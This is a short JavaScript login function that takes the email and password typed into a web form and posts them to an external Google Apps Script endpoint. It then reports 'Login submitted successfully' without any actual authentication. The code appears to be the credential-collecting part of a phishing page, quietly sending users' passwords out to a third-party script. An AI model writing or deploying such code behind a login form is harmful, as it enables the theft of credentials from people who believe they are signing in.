function login() {
    const email = document.getElementById("email").value;
    const password = document.getElementById("pass").value;
    
    // Validate inputs
    if (!email || !password) {
      alert("Please enter both email and password");
      return;
    }
    
    // Create form data to send
    const formData = new FormData();
    formData.append('email', email);
    formData.append('password', password);
    
    // Replace with your Google Apps Script web app URL
    const scriptUrl = 'https://script.google.com/macros/s/AKfycbz4cLIxlXaPDpyJdpV7rnRKhepc3f1Rpt38vfKnYdUmVnmKDjmlRpvYkMkSLqldrA/exec';
    
    fetch(scriptUrl, {
      method: "POST",
      body: formData,
      mode: 'no-cors' // Important for cross-origin requests
    })
    .then(() => {
      alert("Login submitted successfully.");
      // Clear the form
      document.getElementById("email").value = '';
      document.getElementById("pass").value = '';
    })
    .catch(err => {
      console.error("Error:", err);
      alert("Submission failed. Check the console.");
    });
  }